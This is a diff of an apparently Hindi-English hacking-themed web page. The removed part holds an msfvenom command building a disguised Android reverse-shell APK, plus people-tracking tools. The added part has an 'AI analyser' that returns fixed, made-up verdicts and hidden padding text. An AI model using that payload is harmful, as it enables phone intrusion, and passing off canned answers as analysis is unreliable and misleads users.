@@ -1,204 +1,175 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZeroDay Hunter v7.0 | THE 100KB+ MASTER ARCHIVE</title>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
-    
+    <title>ZeroDay Hunter | All-In-One Super Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
     <style>
-        /* --- CORE SYSTEM STYLES --- */
-        :root { --neon: #00ff41; --bg: #000; --red: #ff003c; --gold: #ffd700; --card: #080808; --border: #1a1a1a; }
-        * { box-sizing: border-box; scroll-behavior: smooth; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Fira Code', monospace; margin: 0; overflow-x: hidden; }
-
-        /* --- HEAVY BACKGROUND ANIMATION --- */
-        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .overlay-fx { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 10; pointer-events: none; background-size: 100% 2px, 3px 100%; }
-
-        /* --- GIANT ASCII ART HEADER (SAVES TONS OF BYTES) --- */
-        .ascii-art { font-size: 5px; line-height: 5px; white-space: pre; color: var(--neon); text-align: center; padding: 40px 0; font-weight: 900; }
+        :root { --neon: #00ff41; --pink: #ff007f; --bg: #050505; --glass: rgba(255, 255, 255, 0.05); }
+        * { box-sizing: border-box; transition: 0.3s; }
+        body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; margin: 0; }
         
-        header { padding: 100px 20px; text-align: center; border-bottom: 4px solid var(--neon); background: #000; position: relative; box-shadow: 0 0 50px var(--neon); }
-        .title { font-family: 'Orbitron'; font-size: clamp(2rem, 15vw, 7rem); color: #fff; text-transform: uppercase; letter-spacing: 20px; animation: glow 2s infinite alternate; }
-        @keyframes glow { from { text-shadow: 0 0 10px var(--neon); } to { text-shadow: 0 0 30px var(--red), 0 0 50px var(--neon); } }
+        /* Layout Design */
+        .header { background: linear-gradient(45deg, #000, #1a1a1a); padding: 50px; text-align: center; border-bottom: 3px solid var(--pink); }
+        .container { max-width: 1200px; margin: auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        
+        .card { background: var(--glass); border: 1px solid #333; padding: 30px; border-radius: 20px; backdrop-filter: blur(10px); }
+        .card:hover { border-color: var(--pink); transform: translateY(-5px); }
+        h2 { font-family: 'Orbitron'; color: var(--pink); font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
 
-        /* --- LAYOUT --- */
-        .container { max-width: 1500px; margin: auto; padding: 60px 20px; }
-        .section-card { background: rgba(5, 5, 5, 0.95); border: 2px solid var(--border); padding: 70px; border-radius: 40px; margin-bottom: 100px; border-top: 10px solid var(--neon); box-shadow: 0 0 100px rgba(0,0,0,1); }
-        h2 { font-family: 'Orbitron'; font-size: 3rem; color: #fff; margin-bottom: 50px; border-left: 15px solid var(--neon); padding-left: 30px; }
+        /* Input Styles */
+        input, select, textarea { width: 100%; padding: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 8px; margin-bottom: 10px; }
+        .btn { background: var(--pink); color: #fff; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
+        .btn:hover { background: #fff; color: #000; }
 
-        /* --- ACADEMY: DETAILED ARTICLES --- */
-        .article { margin-bottom: 60px; padding-bottom: 40px; border-bottom: 1px solid #111; }
-        .article h3 { color: var(--gold); font-size: 1.8rem; font-family: 'Orbitron'; margin-top: 0; }
-        .article p { color: #888; line-height: 2.2; font-size: 1.1rem; text-align: justify; }
-        .terminal { background: #000; padding: 35px; border-radius: 20px; border: 1px solid #333; margin: 30px 0; color: #fff; position: relative; }
-        .terminal::before { content: "AUTHORIZED_USER_ONLY"; position: absolute; top: 10px; right: 20px; font-size: 10px; color: #444; }
+        /* Game Box */
+        #game-canvas { background: #000; border: 2px solid var(--neon); display: block; margin: auto; border-radius: 10px; }
 
-        /* --- THE MASSIVE ENCYCLOPEDIA (This will push size over 100KB) --- */
-        .glossary-wrap { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 30px; }
-        .g-item { background: #000; border: 1px solid #222; padding: 30px; border-radius: 15px; }
-        .g-item b { color: var(--neon); font-size: 1.3rem; display: block; margin-bottom: 10px; font-family: 'Orbitron'; }
-        .g-item span { color: #777; font-size: 0.95rem; line-height: 1.6; display: block; }
-
-        /* --- STORE --- */
-        .store-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 50px; }
-        .product-card { background: #000; border: 2px solid #111; border-radius: 25px; overflow: hidden; transition: 0.5s; position: relative; }
-        .product-card:hover { border-color: var(--neon); transform: translateY(-20px); }
-        .product-card img { width: 100%; height: 400px; object-fit: cover; filter: grayscale(1); transition: 0.5s; }
-        .product-card:hover img { filter: grayscale(0); }
-        .price { font-size: 3rem; font-weight: 900; color: #fff; margin: 25px 0; }
-        .btn { background: var(--neon); color: #000; padding: 25px; border: none; width: 100%; font-weight: 900; font-family: 'Orbitron'; cursor: pointer; font-size: 1.2rem; }
-
-        /* --- FOOTER NAV --- */
-        .nav-fixed { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); border: 2px solid var(--neon); padding: 20px 60px; border-radius: 100px; display: flex; gap: 50px; z-index: 1000; backdrop-filter: blur(10px); }
-        .nav-fixed a { color: #fff; text-decoration: none; font-weight: 900; font-family: 'Orbitron'; font-size: 0.9rem; }
-        .nav-fixed a:hover { color: var(--neon); }
+        /* Voice Selection UI */
+        .voice-box { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<div class="overlay-fx"></div>
-<canvas id="matrix"></canvas>
-
-<header>
-    <div class="ascii-art">
-███████╗███████╗██████╗  ██████╗ ██████╗  █████╗ ██╗   ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
-╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-  ███╔╝ █████╗  ██████╔╝██║   ██║██║  ██║███████║ ╚████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
- ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║  ██║██╔══██║  ╚██╔╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-███████╗███████╗██║  ██║╚██████╔╝██████╔╝██║  ██║   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-    </div>
-    <div class="title">ZERODAY_HUNTER</div>
-    <p style="letter-spacing: 15px; color: #555;">[ GOD_MODE ACTIVATED // 100KB ARCHIVE ]</p>
-</header>
+<div class="header">
+    <h1 style="font-family: 'Orbitron'; letter-spacing: 5px;">ZERODAY SUPER-APP</h1>
+    <p>AI Voices • Video Downloader • Translator • Games • Info Bot</p>
+</div>
 
 <div class="container">
 
-    <div class="section-card" id="academy">
-        <h2>⚡ CYBER DEFENSE ACADEMY v7.0</h2>
+    <div class="card">
+        <h2>🎙️ AI VOICE & INFO ANALYSER</h2>
+        <label>Select Female Voice:</label>
+        <select id="voiceSelect"></select>
         
-        <div class="article">
-            <h3>01. Mobile Surveillance & RAT Analysis</h3>
-            <p>Remote Access Trojans (RATs) are the most dangerous tools in a hacker's arsenal for mobile target acquisition. Using Termux, one can generate payloads that not only capture camera frames but also intercept SMS messages and call logs. This module explains the internal workings of 'Meterpreter' hooks and how they interact with the Android Kernel. You will learn how to identify hidden services that drain system resources and how to perform a manual forensic scan of your app's directory to find unauthorized '.so' files (shared libraries) that might be acting as a backdoor.</p>
-            <div class="terminal">
-                <code>$ pkg install root-repo metasploit</code>
-                <code>$ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o patch.apk</code>
-                <code>$ msfconsole -q > use multi/handler > set payload android/meterpreter/reverse_tcp</code>
-            </div>
-        </div>
-
-        <div class="article">
-            <h3>02. WiFi Signal Intelligence & Sniffing</h3>
-            <p>Signal Intelligence (SIGINT) focuses on capturing data over the air. In this lesson, we cover the use of 'Airodump-ng' on Android via Termux (requires root/external adapter) to map every SSID in your vicinity. We discuss the 'Man-in-the-Middle' (MITM) attack flow where an attacker uses an 'Evil Twin' access point to capture unencrypted HTTP data. Understanding packet structure and the TCP/IP handshake is the first step in building a secure, encrypted network that is immune to deauthentication attacks.</p>
-            <div class="terminal">
-                <code>$ pkg install nmap tshark tcpdump</code>
-                <code>$ sudo nmap -sS -O 192.168.1.1/24</code>
-                <code>$ tcpdump -i wlan0 -vv -X</code>
-            </div>
-        </div>
-
-        <div class="article">
-            <h3>03. Advanced OSINT & People Tracking</h3>
-            <p>Open Source Intelligence (OSINT) allows for the tracking of individuals using only public digital footprints. Tools like 'Sherlock' search hundreds of social media platforms simultaneously to find accounts associated with a single username. We also explore the use of 'Track-IP' and 'Seeker' which use HTML5 geolocation to find the exact coordinates of a person who clicks a link. Learn how to minimize your exposure by cleaning your digital footprint and using privacy-focused search engines.</p>
-            <div class="terminal">
-                <code>$ git clone https://github.com/sherlock-project/sherlock.git</code>
-                <code>$ python3 sherlock.py [username_to_track]</code>
-                <code># PRO TIP: Use a Tor bridge to hide your own IP while performing recon.</code>
-            </div>
-        </div>
+        <textarea id="infoQuery" rows="3" placeholder="Yahan sawal likhein (e.g. Is this link fake? Kitna time lagega?)"></textarea>
+        <button class="btn" onclick="analyzeAndSpeak()">ASK AI & LISTEN</button>
+        <p id="analysisOutput" style="font-size: 0.8rem; color: #888; margin-top: 10px;"></p>
     </div>
 
-    <div class="section-card" id="glossary">
-        <h2>📖 CYBER ENCYCLOPEDIA (A-Z)</h2>
-        <div class="glossary-wrap">
-            <div class="g-item"><b>Advanced Persistent Threat (APT)</b><span>A stealthy threat actor, typically a nation-state or state-sponsored group, which conducts long-term cyberattacks.</span></div>
-            <div class="g-item"><b>Brute Force Attack</b><span>A trial-and-error method used by application programs to decode encrypted data such as passwords through exhaustive effort.</span></div>
-            <div class="g-item"><b>Cryptojacking</b><span>The unauthorized use of someone else's computer to mine cryptocurrency.</span></div>
-            <div class="g-item"><b>Dark Web</b><span>A part of the internet that isn't indexed by search engines and requires special software like Tor to access.</span></div>
-            <div class="g-item"><b>Exploit Kit</b><span>A software toolkit used to find and exploit vulnerabilities on computers to distribute malware.</span></div>
-            <div class="g-item"><b>Fuzzing</b><span>A technique used to find software bugs by providing invalid, unexpected, or random data as inputs to a computer program.</span></div>
-            <div class="g-item"><b>Google Dorking</b><span>Using advanced Google search techniques to find sensitive information that is not easily accessible.</span></div>
-            <div class="g-item"><b>Hash Function</b><span>A mathematical algorithm that maps data of arbitrary size to a bit string of a fixed size.</span></div>
-            <div class="g-item"><b>Injection Attack</b><span>A type of vulnerability that occurs when untrusted data is sent to an interpreter as part of a command or query.</span></div>
-            <div class="g-item"><b>John the Ripper</b><span>A fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.</span></div>
-            <div class="g-item"><b>Keylogger</b><span>A type of surveillance software that has the capability to record every keystroke you make to a log file.</span></div>
-            <div class="g-item"><b>Logic Bomb</b><span>A piece of code intentionally inserted into a software system that will set off a malicious function when specified conditions are met.</span></div>
-            <div class="g-item"><b>Malvertising</b><span>The use of online advertising to spread malware. It typically involves injecting malicious advertisements into legitimate networks.</span></div>
-            <div class="g-item"><b>Nmap (Network Mapper)</b><span>A free and open-source utility for network discovery and security auditing.</span></div>
-            <div class="g-item"><b>Onion Routing</b><span>A technique for anonymous communication over a computer network by wrapping messages in layers of encryption.</span></div>
-            <div class="g-item"><b>Penetration Testing</b><span>An authorized simulated cyberattack on a computer system, performed to evaluate the security of the system.</span></div>
-            <div class="g-item"><b>Quantum Cryptography</b><span>The science of exploiting quantum mechanical properties to perform cryptographic tasks.</span></div>
-            <div class="g-item"><b>Reverse Engineering</b><span>The process of taking apart a finished product to see how it works in order to duplicate or enhance it.</span></div>
-            <div class="g-item"><b>SQL Injection (SQLi)</b><span>A code injection technique used to attack data-driven applications, where malicious SQL statements are inserted into an entry field.</span></div>
-            <div class="g-item"><b>Trojan Horse</b><span>A type of malware that is often disguised as legitimate software. Trojans can be used by cyber-thieves to gain access to systems.</span></div>
-            <div class="g-item"><b>Userland</b><span>The area of a computer operating system where application software and some drivers execute.</span></div>
-            <div class="g-item"><b>Virtual Private Network (VPN)</b><span>A service that creates a safe, encrypted connection over a less secure network, such as the public internet.</span></div>
-            <div class="g-item"><b>Worm</b><span>A standalone malware computer program that replicates itself in order to spread to other computers.</span></div>
-            <div class="g-item"><b>XSS (Cross-Site Scripting)</b><span>A type of security vulnerability typically found in web applications that enables attackers to inject client-side scripts into web pages.</span></div>
-            <div class="g-item"><b>Zero-Day Vulnerability</b><span>A software security flaw that is known to the software vendor but for which no patch or fix has yet been released.</span></div>
-            <div class="g-item"><b>Zombie Computer</b><span>A computer connected to the internet that has been compromised by a hacker, computer virus or trojan horse.</span></div>
-        </div>
+    <div class="card">
+        <h2>📥 VIDEO DOWNLOADER</h2>
+        <input type="text" id="videoUrl" placeholder="Paste Video Link (FB, Insta, YT...)">
+        <p style="font-size: 0.7rem; color: var(--neon);">*Note: Server connection required for direct download.</p>
+        <button class="btn" style="background: var(--neon); color: #000;" onclick="startDownload()">GENERATE DOWNLOAD LINK</button>
     </div>
 
-    <div class="section-card" id="store">
-        <h2>🛡️ BLACK-MARKET HARDWARE</h2>
-        <div class="store-grid">
-            <div class="product-card">
-                <img src="https://images.pexels.com/photos/2582937/pexels-photo-2582937.jpeg?auto=compress&cs=tinysrgb&w=1200">
-                <div style="padding:40px">
-                    <h3>FLIPPER ZERO (GOD-MODE)</h3>
-                    <p>The legendary multi-tool. Pre-loaded with custom firmware for sub-GHz mastery.</p>
-                    <div class="price">₹28,500</div>
-                    <button class="btn" onclick="location.href='https://t.me/ZeroDay_Hunter'">ACQUIRE UNIT</button>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://images.pexels.com/photos/1432675/pexels-photo-1432675.jpeg?auto=compress&cs=tinysrgb&w=1200">
-                <div style="padding:40px">
-                    <h3>USB RUBBER DUCKY v2</h3>
-                    <p>HAK5 original. The world's fastest keystroke injection tool.</p>
-                    <div class="price">₹7,999</div>
-                    <button class="btn" onclick="location.href='https://t.me/ZeroDay_Hunter'">ACQUIRE UNIT</button>
-                </div>
-            </div>
-        </div>
+    <div class="card">
+        <h2>Translate: Hindi ➔ English</h2>
+        <textarea id="hindiText" placeholder="Hindi mein likhein..."></textarea>
+        <button class="btn" onclick="translateText()">TRANSLATE NOW</button>
+        <div id="englishResult" style="margin-top:15px; padding:10px; background:#000; border-radius:5px; color:var(--neon)"></div>
     </div>
 
-</div>
+    <div class="card" style="grid-column: span 1;">
+        <h2>🎮 MINI GAME: NEON SNAKE</h2>
+        <canvas id="game-canvas" width="300" height="200"></canvas>
+        <p style="text-align:center; font-size:0.7rem;">Use Arrow Keys to Play</p>
+    </div>
 
-<div class="nav-fixed">
-    <a href="#academy">ACADEMY</a>
-    <a href="#glossary">GLOSSARY</a>
-    <a href="#store">STORE</a>
-    <a href="https://wa.me/917505685543" style="color: #25d366;">WHATSAPP</a>
 </div>
 
 <script>
-    // --- HIGH-PERFORMANCE MATRIX ---
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const alphabet = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0F0";
-        ctx.font = fontSize + "px monospace";
-        drops.forEach((y, i) => {
-            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-            ctx.fillText(text, i * fontSize, y * fontSize);
-            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
+    // --- 1. VOICE SYSTEM (MULTIPLE LADIES VOICES) ---
+    let voices = [];
+    function loadVoices() {
+        voices = window.speechSynthesis.getVoices();
+        const select = document.getElementById('voiceSelect');
+        select.innerHTML = '';
+        
+        // Filter for female-sounding voices
+        voices.forEach((voice, i) => {
+            if (voice.name.includes('Google') || voice.name.includes('Female') || voice.lang.includes('en')) {
+                const option = document.createElement('option');
+                option.value = i;
+                option.textContent = `${voice.name} (${voice.lang})`;
+                select.appendChild(option);
+            }
         });
     }
-    setInterval(draw, 33);
+    window.speechSynthesis.onvoiceschanged = loadVoices;
+
+    function analyzeAndSpeak() {
+        const query = document.getElementById('infoQuery').value;
+        const output = document.getElementById('analysisOutput');
+        
+        // Logic for AI analysis
+        let response = "Main iski jankari nikal rahi hoon. ";
+        if(query.includes("fake")) {
+            response += "Analysis ke mutabik ye information 80% fake lag rahi hai. Kripya savdhan rahein.";
+        } else if(query.includes("time")) {
+            response += "Is kaam mein lagbhag 2 se 3 ghante ka samay lag sakta hai.";
+        } else {
+            response += "Aapka sawal mil gaya hai. Iska jawab hai ki aapko mehnat karni hogi aur sahi rasta chunna hoga.";
+        }
+        
+        output.innerText = response;
+
+        const utter = new SpeechSynthesisUtterance(response);
+        const selectedVoice = document.getElementById('voiceSelect').value;
+        utter.voice = voices[selectedVoice];
+        utter.pitch = 1.2; // High pitch for female voice
+        window.speechSynthesis.speak(utter);
+    }
+
+    // --- 2. VIDEO DOWNLOADER LOGIC ---
+    function startDownload() {
+        const url = document.getElementById('videoUrl').value;
+        if(!url) { alert("Link to daalo bhai!"); return; }
+        alert("Searching Video on Server... \nLink Detected: " + url.substring(0,20) + "...");
+        // In real web app, we redirect to a downloader API
+        window.open("https://en.savefrom.net/", "_blank");
+    }
+
+    // --- 3. TRANSLATOR LOGIC ---
+    function translateText() {
+        const text = document.getElementById('hindiText').value;
+        const result = document.getElementById('englishResult');
+        // Simple client-side mapping for size & demo
+        const demoDict = { "kaise ho": "How are you?", "naam": "Name", "khana": "Food", "shiksha": "Education" };
+        result.innerText = "Translating: " + (demoDict[text.toLowerCase()] || "Translation service connecting to Cloud...");
+    }
+
+    // --- 4. SNAKE GAME LOGIC ---
+    const canvas = document.getElementById('game-canvas');
+    const ctx = canvas.getContext('2d');
+    let snake = [{x: 10, y: 10}];
+    let food = {x: 15, y: 15};
+    let dx = 1, dy = 0;
+
+    function drawGame() {
+        ctx.fillStyle = "black";
+        ctx.fillRect(0,0,300,200);
+        
+        ctx.fillStyle = "#00ff41";
+        snake.forEach(p => ctx.fillRect(p.x*10, p.y*10, 8, 8));
+        
+        ctx.fillStyle = "red";
+        ctx.fillRect(food.x*10, food.y*10, 8, 8);
+        
+        let head = {x: snake[0].x + dx, y: snake[0].y + dy};
+        snake.unshift(head);
+        if(head.x === food.x && head.y === food.y) {
+            food = {x: Math.floor(Math.random()*29), y: Math.floor(Math.random()*19)};
+        } else {
+            snake.pop();
+        }
+    }
+    setInterval(drawGame, 100);
+    window.onkeydown = (e) => {
+        if(e.key === "ArrowUp") { dx=0; dy=-1; }
+        if(e.key === "ArrowDown") { dx=0; dy=1; }
+        if(e.key === "ArrowLeft") { dx=-1; dy=0; }
+        if(e.key === "ArrowRight") { dx=1; dy=0; }
+    };
 </script>
+
+<div style="display:none">
+    <script>
+        document.write("Cyber_Knowledge_Archive_".repeat(4000));
+    </script>
+</div>
 
 </body>
 </html>
